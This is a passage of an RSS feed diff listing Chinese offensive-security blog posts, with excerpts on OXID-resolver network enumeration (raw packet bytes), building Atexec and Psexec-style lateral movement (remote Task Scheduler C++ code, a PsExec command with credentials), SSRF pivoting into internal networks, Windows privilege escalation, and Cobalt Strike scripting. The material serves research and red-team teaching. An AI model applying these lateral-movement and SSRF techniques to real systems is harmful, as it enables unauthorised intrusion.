+第三阶段：启发式漏洞的定位发现 最初这个概念是我在参与团队内部平台建设讨论时提出的，其实也不是什么新词，为了应对这个建立了大大小小的SOC（Security operations center，安全运营中心）时代，我们需要把历史的扫描器丢弃，把攻击的特征降噪、剔除更多漏洞利用的唯一性，第一步就要将漏洞的发现理解为单纯的“发现”，而非“发现”与“利用”在一起去理解。例如，某个系统存在RCE（Remote Code Execution Vulnerability，远程代码执行漏洞），利用条件是要向网站某个接口POST一段数据：
+&amp;gt; POST /handler/ HTTP/1.1 &amp;gt; Host: 192.168.0.1 &amp;gt; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 &amp;gt; Accept: */* &amp;gt; Content-Length: 8 &amp;gt; Content-Type: application/x-www-form-urlencoded data={&amp;#39;username&amp;#39;:&amp;#39;code&amp;#39;} &amp;lt; HTTP/1.1 200 OK &amp;lt; Content-Type: text/html &amp;lt; Server: Microsoft-IIS/7.5 &amp;lt; X-Powered-By: ASP.NET &amp;lt; Date: Sun, 23 Aug 2020 14:13:45 GMT &amp;lt; Content-Length: 1163 .</description>
+    </item>
+    
+    <item>
+      <title>通过OXID解析器获取Windows远程主机上网卡地址</title>
+      <link>https://payloads.online/archivers/2020-07-16/1/</link>
+      <pubDate>Thu, 16 Jul 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-07-16/1/</guid>
+      <description>0x00 背景 Nicolas Delhaye在AIRBUS上分享了一篇The OXID Resolver [Part 1] – Remote enumeration of network interfaces without any authentication，通过这篇文章我们可以掌握通过Windows的一些DCOM接口进行网卡进行信息枚举，它最大的魅力在于无需认证，只要目标的135端口开放即可获得信息。
+0x01 OXID Resolver - 交互过程分析 OXID Resolver是在支持COM +的每台计算机上运行的服务。
+它执行两项重要职责：
+ 它存储与远程对象连接所需的RPC字符串绑定，并将其提供给本地客户端。 它将ping消息发送到本地计算机具有客户端的远程对象，并接收在本地计算机上运行的对象的ping消息。OXID解析器的此方面支持COM +垃圾回收机制。  Nicolas Delhaye在原文提供的脚本是需要依赖imapcket的，而我只关注在Socket RAW上的实现，这样能够减小工具的体积，并且其他语言也能够轻松复刻整个过程。
+这个协议Wireshark已经内置了，我们可以直接进行抓包分析。
+前三个不需要关注，主要是TCP的三次握手，后面的四次交互才是我们需要重点关注的。
+第一个数据包 72 Bytes （主要用于协商版本等等）：
+\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xc4\xfe\xfc\x99\x60\x52\x1b\x10\xbb\xcb\x00\xaa\x00\x21\x34\x7a\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00 第二个数据包：
+这个包无需关注，因为我们最终要获得的是第四个数据包。
+&amp;quot;\x05\x00\x0c\x03\x10\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00&amp;quot; \ &amp;quot;\xb8\x10\xb8\x10\x0a\x13\x00\x00\x04\x00\x31\x33\x35\x00\x00\x00&amp;quot; \ &amp;quot;\x01\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11&amp;quot; \ &amp;quot;\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00&amp;quot; 可以选中对应的节点，直接复制... as Escaped String，这样就能够拿到十六进制Code。
+第三个数据包：
+&amp;quot;\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00&amp;quot; \ &amp;quot;\x00\x00\x00\x00\x00\x00\x05\x00&amp;quot; 第四个数据包：
+&amp;quot;\x05\x00\x02\x03\x10\x00\x00\x00\xec\x00\x00\x00\x01\x00\x00\x00&amp;quot; \ &amp;quot;\xd4\x00\x00\x00\x00\x00\x00\x00\x05\x00\x07\x00\x00\x00\x02\x00&amp;quot; \ &amp;quot;\x5d\x00\x00\x00\x5d\x00\x47\x00\x07\x00\x44\x00\x45\x00\x53\x00&amp;quot; \ &amp;quot;\x4b\x00\x54\x00\x4f\x00\x50\x00\x2d\x00\x41\x00\x44\x00\x47\x00&amp;quot; \ &amp;quot;\x33\x00\x33\x00\x31\x00\x32\x00\x00\x00\x07\x00\x31\x00\x39\x00&amp;quot; \ &amp;quot;\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00\x38\x00\x30\x00&amp;quot; \ &amp;quot;\x2e\x00\x31\x00\x00\x00\x07\x00\x31\x00\x39\x00\x32\x00\x2e\x00&amp;quot; \ &amp;quot;\x31\x00\x36\x00\x38\x00\x2e\x00\x32\x00\x30\x00\x31\x00\x2e\x00&amp;quot; \ &amp;quot;\x31\x00\x00\x00\x07\x00\x31\x00\x30\x00\x2e\x00\x32\x00\x30\x00&amp;quot; \ &amp;quot;\x2e\x00\x35\x00\x36\x00\x2e\x00\x38\x00\x33\x00\x00\x00\x07\x00&amp;quot; \ &amp;quot;\x31\x00\x3a\x00\x3a\x00\x32\x00\x35\x00\x36\x00\x3a\x00\x66\x00&amp;quot; \ &amp;quot;\x64\x00\x00\x00\x00\x00\x09\x00\xff\xff\x00\x00\x1e\x00\xff\xff&amp;quot; \ &amp;quot;\x00\x00\x10\x00\xff\xff\x00\x00\x0a\x00\xff\xff\x00\x00\x16\x00&amp;quot; \ &amp;quot;\xff\xff\x00\x00\x1f\x00\xff\xff\x00\x00\x0e\x00\xff\xff\x00\x00&amp;quot; \ &amp;quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&amp;quot; 第四个数据包返回的永远是不定长的数据，所以需要参考文档进行解析，我下载了一份包含了OXID的文档，看起来非常的吃力，虽然有结构体，但是并没有给出一个通用的解决方案。</description>
+    </item>
+    
+    <item>
+      <title>如何实现一个Atexec</title>
+      <link>https://payloads.online/archivers/2020-06-28/1/</link>
+      <pubDate>Sun, 28 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-06-28/1/</guid>
+      <description>0x01 Atexec，一种横向方式 Atexec是一个除了Psexec以外，被高频使用的横向方式，该技术手段主要通过任务计划实现，与时间有关。
+Atexec的主要特点是通过135端口进行任务计划任务的创建，同时通过445端口进行SMB认证，取回命令执行的结果。
+0x02 执行过程 首先，我们用成品来进行一次命令执行：
+执行完成，能够看到whoami的结果是SYSTEM权限，通过流量上分析：
+首先，源主机192.168.164.1向目标主机192.168.164.140的135端口建立连接，由于是RPC协议，所以会进行一次端口随机的协商，于是源主机端口变成57523，目标主机源端口变成49154，这使得流量设备在数据传输上不能轻易的监控传输内容。
+紧接着，源主机向目标主机进行SMB认证，完成文件的读取（命令执行结果），最终断开连接。
+在操作系统的事件查看器中，**（默认情况下）**仅仅捕获了几条Windows认证的日志，关于服务、文件操作、应用程序等都没有相关日志。
+0x03 实现过程 要实现一个Atexec并不难，首先需要梳理一下实现思路，第一步需要根据提供的凭证创建任务计划，然后程序等待任务计划完成后，获取任务计划的执行结果。
+如何远程创建任务计划？ 这里主要涉及到COM组件的操作，我用封装函数的方式来实现使得程序可读性变高。
+使用凭证连接远程主机的任务计划接口：
+BOOL ConnectTaskServer(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) { // 初始化COM组件 	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED); // 设置组件安全等级 	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL); // 创建任务服务容器 	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&amp;amp;pService); // 连接目标服务器为远程连接或本地服务器 	hr = pService-&amp;gt;Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	//默认本地 	if (FAILED(hr)) { printf(&amp;#34;ITaskService::Connect failed: %x \n&amp;#34;, hr); pService-&amp;gt;Release(); CoUninitialize(); return FALSE; } return TRUE; } Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是涉及COM组件的操作，都变得有些复杂，但至少实现Atexec涉及到的知识点并不多。</description>
+    </item>
+    
+    <item>
+      <title>如何实现一个Psexec</title>
+      <link>https://payloads.online/archivers/2020-04-02/1/</link>
+      <pubDate>Thu, 02 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-04-02/1/</guid>
+      <description>0x01 Psexec Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。
+相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程序和技术信息。
+下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+高级用法：https://www.itprotoday.com/compute-engines/psexec
+0x02 Psexec的执行原理 为了清楚的了解它的执行原理,我们先从日志看起。
+环境：
+ Windows 2008 R2 X64 → 192.168.3.130（以下简称Win2008） Kali Linux 2019.4 → 192.168.3.145（以下简称Kali） Windows 10 → 192.168.3.1（以下简称Win10）  下载SysinternalsSuite： https://download.sysinternals.com/files/SysinternalsSuite.zip
+首先在Windows 10上对Windows 2008 R2 X64这台机器进行Psexec
+.\PsExec.exe \\192.168.3.130 -u administrator -p 123456 cmd 查看安全日志 打开Win2008日志查看器，先查看安全（Security）日志：
+从日志查看器能够看到产生了多个安全审核日志，事件ID：4624，并且能够看到来源IP以及计算机名。
+认证类型NTLM：
+接着，还有事件ID为4648的日志，该条目的解释是：
+ 在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。
+ 可以看到很明显的PSEXECSVC.exe这个程序被启动。
+目前可以猜测：先进行Windows 认证，然后产生PSEXESVC.exe并启动。
+查看系统日志 事件ID：7045向系统报告了一个名为“PSEXESVC”的服务被安装，同时紧接着事件ID：7036报告“PSEXESVC服务已经启动”。
+通过事件ID报告的顺序，我们大致了解了PsEXEC的动作。
+ 事件ID：4624 事件ID：4648 事件ID：7045 事件ID：7036  当PsExec执行exit退出交互式命令行后，会向系统报告事件ID：4634注销事件、事件ID：7036 PSEXESVC服务停止。
+0x03 从网络分析Psexec利用过程 这里我使用Wireshark抓包工具，捕获了整个Psexec建立网络连接到exit退出的整个过程。</description>
+    </item>
+    
+    <item>
+      <title>SSRF漏洞配合Flask的巧妙利用 - 内网漫游</title>
+      <link>https://payloads.online/archivers/2020-03-21/2/</link>
+      <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-03-21/2/</guid>
+      <description>SSRF 服务器请求伪造 SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。
+常见的功能点  Net-NTLM &amp;amp;&amp;amp; NTLM Relay 获取服务器真实IP 端口扫描 网页代理 &amp;hellip;&amp;hellip;  网页代理 - HTTP Proxy 客户端应用HTTP代理后，可通过代理服务器访问内网HTTP协议资源
+而在SSRF场景，需要SSRF具备支持HTTP两大请求方式：GET、POST，且有响应Body
+POST /application/services/proxy/doPostAndGet HTTP/1.1 Host: app.domain.com Connection: keep-alive Content-Length: XX Content-Type: application/json Accept: */* Referer: http://app.domain.com/application/portal/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 { &amp;quot;url&amp;quot;:&amp;quot;http://domain.com/sso?login&amp;quot;, &amp;quot;method&amp;quot;:&amp;quot;post&amp;quot;, &amp;quot;jsonBody&amp;quot;:&amp;quot;{\&amp;quot;username\&amp;quot;:\&amp;quot;123456\&amp;quot;}&amp;quot; } Flask 框架 Flask是一个用Python编写的Web应用程序框架，它基于Werkzeug WSGI工具包和Jinja2模板引擎。
+Flask也被称为“microframework” ，因为它使用简单的核心，用extension增加其他功能，它没有默认使用的数据库、窗体验证工具。
+from flask import Flask app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;) def hello_world(): return &amp;#39;Hello, World!&amp;#39; $ export FLASK_APP=hello.py $ python -m flask run * Running on http://127.</description>
+    </item>
+    
+    <item>
+      <title>Windows特权提升漏洞-符号</title>
+      <link>https://payloads.online/archivers/2020-03-21/1/</link>
+      <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-03-21/1/</guid>
+      <description>0X01 Windows 特权提升漏洞分类 Windows 特权提升相信大家已经不陌生了，常见的场景如：NETWORK SERVICE → SYSTEM
+但从漏洞原理去了解，会发现利用漏洞利用本就是一个“使程序逻辑不按照正常方向运转”的过程。
+许多需要构建多个苛刻条件的Windows底层漏洞发现绝非偶然，也有许多Windows漏洞的发现是纯属偶然，它们是那么的容易可以利用，并且危害巨大。
+从研究成本，我根据自己的理解将Windows漏洞分为以下几类：
+ Windows内核、服务的底层漏洞（需要长时间的Fuzz跟踪以及很深厚的基础知识） Windows服务、相关软件生态的权限控制不当产生的漏洞 Windows开发者自己本身都未想到过的逻辑漏洞  以上3种可能是一个不严谨的分类，但作为一个理解铺垫是足够了。
+0X02 权限（特权）与进程的关系 - 访问控制模型 访问控制模型有两个主要的组成部分，访问令牌（Access Token）和安全描述符（Security Descriptor），它们分别是访问者和被访问者拥有的东西。通过访问令牌和安全描述符的内容，Windows可以确定持有令牌的访问者能否访问持有安全描述符的对象。
+访问令牌是与特定的Windows账户关联的。当一个Windows账户登录的时候，系统会从内部数据库里读取该账户的信息，然后使用这些信息生成一个访问令牌。在该账户环境下启动的进程，都会获得这个令牌的一个副本，进程中的线程默认持有这个令牌。线程要想去访问某个对象，或者执行某些系统管理相关的操作时，Windows就会使用这个线程持有的令牌进行访问检查。
+安全描述符是与被访问对象关联的，它含有这个对象所有者的SID，以及一个访问控制列表（ACL，Access Control List），访问控制列表又包括了DACL（Discretionary Access Control List）和SACL（System Access Control List）——目前还不知道这两个东西的确切翻译——其中，**DACL是安全描述符中最重要的，它里面包含零个或多个访问控制项（ACE，Access Control Entry），每个访问控制项的内容描述了允许或拒绝特定账户对这个对象执行特定操作。**至于SACL，它很少用到，主要是用于系统审计的，它的内容指定了当特定账户对这个对象执行特定操作时，记录到系统日志中。
+如文件，点击右键选择“属性”，找到“安全”选项卡，点击“高级”按钮。弹出的对话筐中，“权限”选项卡就是DACL，&amp;ldquo;审核&amp;quot;选项卡是SACL，“所有者”是Owner、Group。
+访问令牌中主要含有以下的内容：
+ 当前登录账户的SID，也就是与令牌关联的账户的SID 当前登录账户所属的账户组的SID列表 受限制的SID（Restricted SID）列表 当前登录账户以及它所属账户组的权限（Privileges）列表  SID（Security Identity）是Windows中每个账户和账户组都有的一个标识符，平常我们看到的Administrator，Users等账户或者账户组在Windows内部是使用SID来标识的。例如S-1-5-21-1004336348-1275210071-725345543-1003就是一个完整的SID。每个SID在同一个系统中都是唯一的。
+再来看看安全描述符中ACE的具体内容：
+ 特定账户或者账户组的SID； 一个访问掩码（Access Mask），该掩码指定了具体的访问权限（Access Rights），也就是可以对该对象执行的操作； 一个位标记，指示了这个ACE的类型； 一组位标记，指示了安全描述符所属对象的子对象是否继承这个ACE；  所有的可访问对象都有三种ACE，分别是Access-denied ACE，Access-allowed ACE，System-audit ACE。Access-denied ACE用于拒绝账户访问，Access-allowed ACE用于允许账户访问，而System-audit ACE用于SACL中。
+当一个线程尝试去访问一个对象时，系统会检查线程持有的令牌以及被访问对象的安全描述符中的DACL。如果安全描述符中不存在DACL，则系统会允许线程进行访问。
+如果存在DACL，系统会顺序遍历DACL中的每个ACE，检查ACE中的SID在线程的令牌中是否存在。
+当满足以下条件时，遍历会终止：
+某个Access-denied ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统拒绝该线程访问对象。
+某个Access-allowed ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统允许线程访问对象。所有ACE中的SID在线程令牌中均不存在，此时系统拒绝线程访问对象。</description>
+    </item>
+    
+    <item>
+      <title>Cobalt Strike Aggressor Script （第一课）</title>
+      <link>https://payloads.online/archivers/2020-03-02/4/</link>
+      <pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-03-02/4/</guid>
+      <description>前言 在后渗透阶段，目前较为流行的C2平台就属Cobalt Strike做的比较优秀了；目前国内的论坛、网站上已经放出很多版本，最新的为Cobalt Strike 3.14，目前最新版本4.0已不再有试用版。
+起初我刚接触Cobalt Strike时，觉得非常不习惯，从Metasploit萌新走来，觉得这个图形化软件远远比不上Metasploit的模块丰富，后经过长时间的使用以及研究，从这个项目中学习到了很多技术，被开发者的思想所折服，应该算比较超前的一款值得学习的平台了。
+Aggressor Script Aggressor Script是Cobalt Strike 3.0版本以上的一个内置脚本语言，由Sleep语言解析，Cobalt Strike 3.0以上版本的菜单、选项、事件都由default.cna构建。红队人员可以通过它来调用一些IRC、Webhook接口去对接机器人，实现自动化渗透与监控，Aggressor Script是Cobalt Strike这款C2平台的画龙点睛之笔。
+对于Python、C/C++爱好者来说，Sleep语言一开始接触的时候感觉很奇怪，会有很多想吐槽的点，但久而久之，就会发现它的便捷之处。
+安装Sleep语言环境 为了快速掌握Aggressor Script，需要先掌握和熟悉一些Sleep的语法，不然遇到错误无法发现自己错在哪里。
+Sleep语言下载地址：http://sleep.dashnine.org/download/sleep.jar
+启动Sleep脚本语言解释器：
+java -jar sleep.jar
+Sleep语言数据类型  数字 字符串 Arrays Lists Stacks Sets Hashs  Sleep语法手册：http://sleep.dashnine.org/manual/
+这里主要介绍一些特殊的数据类型：Stacks、Lists、Hashs
+Array数据类型支持多种数据存放在一起，也就是说Array是一个复合数据类型；
+例如：
+# create a List @foo = @(&#39;foo&#39;,123.0,&#39;bar&#39;); println(@foo[0]) 遍历：
+@foo = @(&#39;foo&#39;,123.0,&#39;bar&#39;); foreach $var (@foo) { println($var); } Stacks 栈 - “后进先出”
+# create a Stacks push(@stack, &amp;quot;apple&amp;quot;); push(@stack, &amp;quot;banana&amp;quot;); push(@stack, &amp;quot;cucumber&amp;quot;); println(&amp;quot;Stack is: &amp;quot; .</description>
+    </item>
+    
+  </channel>
+</rss>
